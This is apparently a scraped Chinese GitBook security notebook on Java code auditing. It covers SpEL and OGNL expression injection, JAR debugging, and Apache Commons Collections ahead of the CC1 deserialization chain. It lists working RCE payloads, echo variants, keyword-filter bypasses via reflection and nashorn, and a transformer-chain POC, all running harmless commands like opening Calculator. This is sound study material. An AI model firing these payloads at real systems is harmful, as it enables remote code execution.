演示因为是本地环境，且是将输入的参数直接当成SpEL表达式去执行的，所以没有输入#{}，但是如果用@Value去获取值执行就需要了 @Value(\"#{ T(java.lang.Math).random() * 100.0 }\") private int rand; SpEL表达式分类 基本表达式 字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式； 类相关表达式 类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用； 集合相关表达式 内联 List、内联数组、集合、字典访问、列表、字典； 其他表达式 模版表达式 SpEL类相关表达式‼️ 类类型表达式 使用\"T(Type)\"来表示 java.lang.Class 实例，\"Type\"必须是类全限定名，\"java.lang\"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 举例 // java.lang 包类访问 T(String) // 其他包类访问 T(java.lang.Runtime).getRuntime().exec('open -na Calculator') //类静态字段访问 T(Integer).MAX_VALUE //类静态方法调用 T(Integer).parseInt('1') 类实例化 类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 new java.util.Date() instanceof 表达式 SpEL 支持 instanceof 运算符，跟 Java 内使用同义 \"test\" instanceof T(String) 常用payload ${12*12} T(java.lang.Runtime).getRuntime().exec(\"open -na Calculator\") T(Thread).sleep(10000) #this.getClass().forName('java.lang.Runtime').getRuntime().exec('open -na Calculator') new java.lang.ProcessBuilder('open -na Calculator').start() 回显 引入了org.apache.commons.io这个包的话，可以输出回显 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()) 绕过方式 如果采用关键词过滤，可以采用反射的方式来绕过 T(String).class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open%20-na%20Calculator\") // + 一定要用url编码，不然浏览器解析会有问题 T(String).class.forName(\"java.lang.Ru\"%2b\"ntime\").getMethod(\"getRu\"%2b\"ntime\").invoke(null).exec(\"open%20-na%20Calculator\") T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).getClass().getMethod(\"exec\",T(String)).invoke(T(java.lang.Runtime).getRuntime(),\"open%20-na%20Calculator\") 使用ScriptEngineManager构造 T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\") T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runt\"%2b\"ime.getRu\"%2b\"ntime().e\"%2b\"xec('open -na Calculator')\") 如果不能使用双引号，那么可以采用生成任意字符+concat函数的形式进行绕过 T(java.lang.Character).toString(97).concat(T(java.lang.Character).toString(98)) 防御 因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞。 官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext。 基础举例 ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build(); return expression.getValue(context).toString(); 参考 Java代码审计之SpEL表达式注入 由浅入深SpEL表达式注入漏洞 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/11.OGNL表达式.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/11.OGNL表达式.html","title":"11.OGNL表达式","keywords":"","body":" 介绍 三要素 使用OGNL表达式 pom.xml 基础用法举例 对Root对象的访问 对上下文对象的访问 对静态变量的访问‼️ 方法的调用‼️ 对数组和集合的访问 投影与选择 创建对象‼️ 和 % 和 $ 的区别 #符 %符 $符 和 . 和 @ 的区别 OGNL表达式注入 注入举例 能解析OGNL的API HTTP请求中常见的注入点 常用payload 参考 介绍 OGNL 是 Object-Graph Navigation Language（对象导航图语言）的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。 Ognl 是一个功能强大的表达式语言，用来获取和设置 java 对象的属性 ，它旨在提供一个更高抽象度语法来对 java 对象图进行导航。 官方文档：https://commons.apache.org/proper/commons-ognl/language-guide.html 对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。 三要素 首先来介绍下 OGNL 的三要素： 表达式（Expression）： 表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。 Root 对象： OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。 上下文环境： 有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。 说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。 使用OGNL表达式 pom.xml ognl ognl 3.1.11 基础用法举例 对Root对象的访问 OGNL 使用的是一种链式的风格进行对象的访问，中间使用.进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); System.out.println(Ognl.getValue(\"age\", user)); // 16 System.out.println(Ognl.getValue(\"name\", user)); // hello System.out.println(Ognl.getValue(\"name.length\", user)); // 5 System.out.println(Ognl.getValue(\"info\", user)); // Info(a=1, b=2) System.out.println(Ognl.getValue(\"info.a\", user)); // 1 } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对上下文对象的访问 使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。 当访问上下文环境当中的参数时候，需要在表达式前面加上 '#' ，表示了与访问 Root 对象的区别。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"#test\", context, user)); // testValue System.out.println(Ognl.getValue(\"#aaa\", context, user)); // User(name=hello, age=16, info=Info(a=1, b=2)) System.out.println(Ognl.getValue(\"#aaa.name\", context, user)); // hello } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对静态变量的访问‼️ 在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 @[class]@[field/method()]。 package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static String test = \"66666\"; public static void main(String[] args) throws OgnlException { System.out.println(Ognl.getValue(\"@org.example.OgnlTest@test\", null)); } } 方法的调用‼️ 如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。 赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"getName()\", context, user)); // null Ognl.getValue(\"setName(#test)\", context, user); // 执行setName方法 System.out.println(Ognl.getValue(\"getName()\", context, user)); // testValue } } @Data class User { private String name; private int age; } 对数组和集合的访问 OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。 package org.example; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { List list = new ArrayList<>(); list.add(\"123\"); list.add(\"456\"); Map map = new HashMap(); map.put(\"test1\", \"value1\"); Map context = new HashMap(); context.put(\"list\", list); context.put(\"map\", map); System.out.println(Ognl.getValue(\"#list[0]\", context, list)); // 123 System.out.println(Ognl.getValue(\"#map['test1']\", context, map)); // value1 } } 投影与选择 OGNL 支持类似数据库当中的选择与投影功能。 个人感觉有点类似stream 投影：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。 选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。 选择操作符有 3 种： ? ：选择满足条件的所有元素 ^：选择满足条件的第一个元素 $：选择满足条件的最后一个元素 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User u1 = new User(\"name1\", 11); User u2 = new User(\"name2\", 22); User u3 = new User(\"name3\", 33); User u4 = new User(\"name4\", 44); ArrayList list = new ArrayList(); list.add(u1); list.add(u2); list.add(u3); list.add(u4); Map context = new HashMap(); context.put(\"list\", list); System.out.println(Ognl.getValue(\"#list.{age}\", context, list)); // [11, 22, 33, 44] System.out.println(Ognl.getValue(\"#list.{? #this.age > 22}\", context, list)); // [User(name=name3, age=33), User(name=name4, age=44)] System.out.println(Ognl.getValue(\"#list.{^ #this.age > 22}\", context, list)); // [User(name=name3, age=33)] System.out.println(Ognl.getValue(\"#list.{$ #this.age > 22}\", context, list)); // [User(name=name4, age=44)] } } @Data class User { private String name; private int age; public User(String name, int age) { this.name = name; this.age = age; } } 创建对象‼️ OGNL 支持直接使用表达式来创建对象。主要有三种情况： 构造 List 对象：使用 {}, 中间使用 ',' 进行分割如 {\"aa\", \"bb\", \"cc\"} 构造 Map 对象：使用 #{}，中间使用 ', 进行分割键值对，键值对使用 ':' 区分，如 #{\"key1\" : \"value1\", \"key2\" : \"value2\"} 构造任意对象：直接使用已知的对象的构造方法进行构造。 System.out.println(Ognl.getValue(\"{'key1','value1'}\", null)); // [key1, value1] System.out.println(Ognl.getValue(\"#{'key1':'value1'}\", null)); // {key1=value1} System.out.println(Ognl.getValue(\"new java.lang.String('123')\", null)); // 123 # 和 % 和 $ 的区别 #符 #符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.{? #this.price； 用于构造Map，如#{'foo1':'bar1', 'foo2':'bar2'}； %符 %符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符 $符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 # 和 . 和 @ 的区别 获取静态函数和变量的时候用@ 获取非静态函数用.号获取 获取非静态变量用#获取 OGNL表达式注入 webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。 由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。 注入举例 格式@[class]@[field/method()] package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { // @[class]@[field/method()] String payload = \"@java.lang.Runtime@getRuntime().exec('open -na Calculator')\"; System.out.println(Ognl.getValue(payload, null)); } } 能解析OGNL的API 能解析OGNL的API如下表： 类名 方法名 com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue ognl.Ognl parseExpression,getValue,setValue 以下是调用过程中可能会涉及到的一些类： 涉及类名 方法名 com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue HTTP请求中常见的注入点 常用payload //获取context里面的变量值 #user #user.name //使用runtime执行系统命令 @java.lang.Runtime@getRuntime().exec(\"calc\") //使用processbuilder执行系统命令 (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //获取当前绝对路径 @java.lang.System@getProperty(\"user.dir\") // e-mobole带回显 @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 参考 OGNL表达式注入漏洞总结 Struts2著名RCE漏洞引发的十年之思 Struts2 中的OGNL、表达式注入及防御 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/12.IDEA调试JAR.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/12.IDEA调试JAR.html","title":"12.IDEA调试JAR","keywords":"","body":" 前言 准备 开始调试 最后 前言 远程调试相对来说还是比较繁琐的，如果可以给jar拿到本地来运行调试，会方便简单很多。 准备 随便准备个JAR即可，比如 https://github.com/halo-dev/halo 下载后得到halo.jar，通过命令java -jar halo.jar即可运行（这个jar运行需要jdk11） 开始调试 新建一个maven空项目，为了运行jar选择用jdk11，其他的随便选选即可 添加配置，选择JAR Application 然后根据实际情况配置 点击Apply，然后就可以在IDEA里面运行这个JAR了 但这个时候还不能调试，还需要添加classes依赖关系 之前也说过，要添加了依赖关系IDEA才会执行这个代码，才能知道你下的断点，才会在那阻断让你分析 先解压这个jar 然后给目录lib添加到依赖中，不然这个jar使用的其他jar依赖不能调试 然后给目录BOOT-INF添加到依赖关系中 然后就可以Debug调试了 下断点有个勾表示成功 成功拦截 最后 虽然说上面已经可以开始调试了，但还是有一些问题 一些函数可能因为不能反编译等等原因，导致找不到，也会影响我们的进程 所以有条件的情况下，可以下载他的源代码，然后给源代码也加入进去（直接点上面的提示choice source file即可） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/01.Apache_Commons_Collections中的反序列化.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/01.Apache_Commons_Collections中的反序列化.html","title":"01.Apache_Commons_Collections中的反序列化","keywords":"","body":" 基础使用 背景介绍 主要特点 包结构介绍 引入依赖 使用介绍 通用集合 Bag 通用集合 BidiMap 通用集合 MapIterator 通用集合 OrderedMap 集合工具类 CollectionUtils 检查是否为空元素 合并两个排序列表 转换列表 过滤列表 检查非空列表 检查空的列表 检查子列表 检查相交 求差集 求联合集 参考教程 Commons Collections1 分析 前言 前置知识 POC示例 Transformer ConstantTransformer InvokerTransformer‼️ ChainedTransformer‼️ 几个Transformer实现类整理 Map TransformedMap‼️ Map.Entry 反射exec 反射利用链 简化链 使用AnnotationInvocationHandler触发反序列化 分析 POC构建过程 完整POC 整体思路 使用LazyMap利用链 介绍 动态代理复习 构建POC 完整POC LazyMap利用链补充 参考 基础使用 背景介绍 Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。 Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。 主要特点 Commons Collections 的主要特点如下 - Bag - Bag 接口简化了每个对象具有多个副本的集合。 BidiMap- BidiMap 接口提供双向映射，可用于使用键或键使用的值来查找值。 MapIterator - MapIterator 接口为映射提供了简单和易于迭代方法。 转换装饰器 - 转换装饰器 (Transforming Decorators) 可以在集合添加到集合时改变集合的每个对象。 复合集合 - 复合集合用于要求统一处理多个集合的情况。 有序映射 - 有序映射保留元素添加的顺序。 有序集 - 有序集保留元素添加的顺序。 参考映射 - 参考映射允许在密切控制下对键 / 值进行垃圾收集。 比较器实现 - 许多比较器实现都可用。 迭代器实现 - 许多迭代器实现都可用。 适配器类 - 适配器类可用于将数组和枚举转换为集合。 实用程序 - 实用程序可用于测试测试或创建集合的典型集合理论属性，如联合，交集。 支持关闭。 包结构介绍 Commons Collections的最新版是4.x (commons-collections4)，但由于工作中大多还是3.x的版本，这里就以3.x中的最后一个版本3.2.2作使用介绍。 以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下的接口和实现，请参考Apache Commons Collections 3.2.2 API文档。 org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类 org.apache.commons.collections.bag – 实现Bag接口的一组类 org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类 org.apache.commons.collections.buffer – 实现Buffer接口的一组类 org.apache.commons.collections.collection –实现java.util.Collection接口的一组类 org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类 org.apache.commons.collections.functors –Commons Collections自定义的一组功能类 org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类 org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类 org.apache.commons.collections.list – 实现java.util.List接口的一组类 org.apache.commons.collections.map – 实现Map系列接口的一组类 org.apache.commons.collections.set – 实现Set系列接口的一组类 引入依赖 commons-collections commons-collections 3.2.2 使用介绍 通用集合 Bag Bag 接口定义了一个集合，它可以计算一个对象出现在集合中的次数。 package org.example; import org.apache.commons.collections.Bag; import org.apache.commons.collections.bag.HashBag; public class App{ public static void main(String[] args) { Bag bag = new HashBag(); bag.add(\"a\", 2); bag.add(\"b\"); bag.add(\"c\"); bag.add(\"c\"); System.out.println(bag); // [2:a,1:b,2:c] System.out.println(bag.getCount(\"c\")); // 2 System.out.println(bag.uniqueSet()); // [a, b, c] bag.remove(\"a\", 1); System.out.println(bag); // [1:a,1:b,2:c] } } 通用集合 BidiMap BidiMap 接口被添加到支持双向映射。 使用双向映射，可以使用值查找键，并且可以使用键轻松查找值。 package org.example; import org.apache.commons.collections.BidiMap; import org.apache.commons.collections.bidimap.TreeBidiMap; public class App { public static void main(String[] args) { BidiMap bidiMap = new TreeBidiMap(); bidiMap.put(\"a\", \"b\"); bidiMap.put(\"c\", \"d\"); System.out.println(bidiMap); // {a=b, c=d} System.out.println(bidiMap.get(\"a\")); // b System.out.println(bidiMap.getKey(\"b\")); // a System.out.println(bidiMap.inverseBidiMap()); // {b=a, d=c} bidiMap.remove(\"a\"); System.out.println(bidiMap); // {c=d} } } 通用集合 MapIterator JDK Map 接口很难作为迭代在 EntrySet 或 KeySet 对象上迭代。 MapIterator 提供了对 Map 的简单迭代。 package org.example; import org.apache.commons.collections.IterableMap; import org.apache.commons.collections.MapIterator; import org.apache.commons.collections.map.HashedMap; public class App { public static void main(String[] args) { IterableMap iterableMap = new HashedMap(); iterableMap.put(\"a\", \"b\"); iterableMap.put(\"c\", \"d\"); iterableMap.put(\"e\", \"F\"); MapIterator mapIterator = iterableMap.mapIterator(); while (mapIterator.hasNext()){ Object key = mapIterator.next(); Object value = mapIterator.getValue(); System.out.println(\"key: \" + key); // key: a System.out.println(\"value: \" + value); // value: b mapIterator.setValue(value + \"TEST\"); } System.out.println(iterableMap); // {a=bTEST, c=dTEST, e=FTEST} } } 通用集合 OrderedMap OrderedMap 是映射的新接口，用于保留添加元素的顺序。 LinkedMap 和 ListOrderedMap 是两种可用的实现。 此接口支持 Map 的迭代器，并允许在 Map 中向前或向后两个方向进行迭代。 package org.example; import org.apache.commons.collections.OrderedMap; import org.apache.commons.collections.map.LinkedMap; public class App { public static void main(String[] args) { OrderedMap map = new LinkedMap(); map.put(\"a\", \"b\"); map.put(\"C\", \"D\"); System.out.println(map.firstKey()); // a System.out.println(map.lastKey()); // C System.out.println(map.nextKey(\"a\")); // C System.out.println(map.previousKey(\"C\")); // a } } 集合工具类 CollectionUtils Apache Commons Collections 库的 CollectionUtils 类提供各种实用方法，用于覆盖广泛用例的常见操作。 它有助于避免编写样板代码。 这个库在 jdk 8 之前是非常有用的，但现在 Java 8 的 Stream API 提供了类似的功能。 检查是否为空元素 CollectionUtils 的 addIgnoreNull() 方法可用于确保只有非空 (null) 值被添加到集合中。 返回值：如果集合已更改，则返回为 True。 List list = new LinkedList(); boolean result1 = CollectionUtils.addIgnoreNull(list, null); System.out.println(result1); // false boolean result2 = CollectionUtils.addIgnoreNull(list, \"a\"); System.out.println(result2); // true System.out.println(list); // [a] System.out.println(list.contains(null)); // false list.add(null); System.out.println(list); // [a, null] System.out.println(list.contains(null)); // true 合并两个排序列表 CollectionUtils 的 collate() 方法可用于合并两个已排序的列表。 返回值：一个新的排序列表，其中包含集合 a 和 b 的元素。 List sortedList1 = Arrays.asList(\"A\", \"C\", \"E\"); List sortedList2 = Arrays.asList(\"B\", \"D\", \"F\"); List mergedList = CollectionUtils.collate(sortedList1, sortedList2); System.out.println(mergedList); // [A, B, C, D, E, F] 转换列表 CollectionUtils 的 collect() 方法可用于将一种类型的对象列表转换为不同类型的对象列表。 返回值：转换结果 (新列表)。 List stringList = Arrays.asList(\"1\", \"2\", \"3\"); List integerList = (List) CollectionUtils.collect(stringList, new Transformer() { @Override public Integer transform(String input) { return Integer.parseInt(input); } }); System.out.println(integerList); // [1, 2, 3] 过滤列表 CollectionUtils 的 filter() 方法可用于过滤列表以移除不满足由谓词传递提供的条件的对象。 返回值：如果通过此调用修改了集合，则返回 true，否则返回 false。 List integerList = new ArrayList(); integerList.addAll(Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8)); System.out.println(integerList); // [1, 2, 3, 4, 5, 6, 7, 8] CollectionUtils.filter(integerList, new Predicate() { @Override public boolean evaluate(Integer input) { if (input.intValue() % 2 == 0) { return true; } return false; } }); System.out.println(integerList); // [2, 4, 6, 8] 检查非空列表 CollectionUtils 的 isNotEmpty() 方法可用于检查列表是否为 null 而不用担心 null 列表。 因此，在检查列表大小之前，不需要将无效检查放在任何地方。 返回值：如果非空且非 null，则返回为:true。 检查空的列表 CollectionUtils 的 isEmpty() 方法可用于检查列表是否为空。 返回值：如果为空或为 null，则返回为 true。 检查子列表 CollectionUtils 的 isSubCollection () 方法可用于检查集合是否包含给定集合。 参数 a - 第一个 (子) 集合不能为空。 b - 第二个 (超集) 集合不能为空。 当且仅当 a 是 b 的子集合时才为 true。 检查相交 CollectionUtils 的 intersection() 方法可用于获取两个集合 (交集) 之间的公共对象部分。 参数 a - 第一个 (子) 集合不能为 null。 b - 第二个 (超集) 集合不能为 null。 返回值：两个集合的交集。 求差集 CollectionUtils 的 subtract() 方法可用于通过从其他集合中减去一个集合的对象来获取新集合。 参数 a - 要从中减去的集合，不能为 null。 b - 要减去的集合，不能为 null。 返回值：两个集合的差集 (新集合)。 求联合集 CollectionUtils 的 union() 方法可用于获取两个集合的联合。 参数 a - 第一个集合，不能为 null。 b - 第二个集合，不能为 null。 返回值：两个集合的联合。 参考教程 Apache Commons Collections教程 Commons Collections1 分析 前言 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。 Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 前置知识 POC示例 先引入依赖 commons-collections commons-collections 3.1 网上的一个POC，先看下涉及哪些类； 因为在调试这条链的时候会涉及到一些没接触过的类，在调试前需要了解到这些类的一个作用，方便后面的理解。 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(\"foobar\"); } } 先运行下查看结果。 成功执行了系统命令。 Transformer Transformer是Commons Collections中提供的一个接口，只有一个待实现的transform方法。 ConstantTransformer ConstantTransformer是接口Transformer的实现类 它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回，其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。 InvokerTransformer‼️ InvokerTransformer也是Transformer的实现类 在构造方法中有三个参数 第⼀个参数是待执⾏的⽅法名 第⼆个参数是这个函数的参数列表的参数类型 第三个参数是传给这个函数的参数列表 里面还提供了一个transform的方法，该方法可以通过Java反射机制来进行执行任意代码。 实现代码举例： 不能直接利用 ChainedTransformer‼️ ChainedTransformer也是实现了Transformer接⼝的⼀个类 看到transform方法是通过传入Trasnformer[]数组来对传入的数值进行遍历并且调用数组对象的transform方法，它的作⽤是将内部的多个Transformer串在⼀起。 通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，将多个Transformer 用过依次调用各自的transform 连接起来，用P牛的⼀个图做示意： 几个Transformer实现类整理 理一理这几个Transfromer。其实一共就三个Transformer,而且这些XxxTransformer都是实现了TransFormer这个接口的，所以他们都有一个transform方法: InvokerTransformer ConstantTransformer ChainedTransformer 构造函数接受三个参数 构造函数接受一个参数 构造函数接受一个TransFormer类型的数组 transform方法通过反射可以执行一个对象的任意方法 transform返回构造函数传入的参数 transform方法执行构造函数传入数组的每一个成员的transform方法 Map Transform来执行命令需要绑定到Map上，抽象类AbstractMapDecorator是Apache Commons Collections提供的一个类，实现类有很多，比如LazyMap、TransformedMap等，这些类都有一个decorate()方法，用于将上述的Transformer实现类绑定到Map上，当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法，不同的Map类型有不同的触发规则。 TransformedMap‼️ TransformedMap这个类是用来对Map进行某些变换（修饰）用的，例如当我们修改Map中的某个值时，就会触发我们预先定义好的某些操作来对Map进行处理（回调）。 通过decorate函数就可以将一个普通的Map转换为一个TransformedMap。第二个参数和第三个参数分别对应当key改变和value改变时对应transform函数需要做的操作； 举个例子： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { Map hashMap = new HashMap(); hashMap.put(\"1\", \"2\"); // key修改执行Test中的transform方法，value修改执行Test1中的transform方法 Map transformedMap = TransformedMap.decorate(hashMap, new Test(), new Test1()); // 两个值都修改就会Test和Test1中的transform都执行 transformedMap.put(\"3\", \"4\"); System.out.println(\"\\n--- 分界线 ---\\n\"); Map.Entry transformedMapValue = (Map.Entry) transformedMap.entrySet().iterator().next(); // 值改变会执行 Test1类 中的transform方法 transformedMapValue.setValue(\"5\"); } } class Test implements Transformer { @Override public Object transform(Object o) { System.out.println(\"Test Object: \" + o.toString()); return \"Test Object\"; } } class Test1 implements Transformer { @Override public Object transform(Object o) { System.out.println(\"Test1 Object: \" + o.toString()); return \"Test1 Object\"; } } 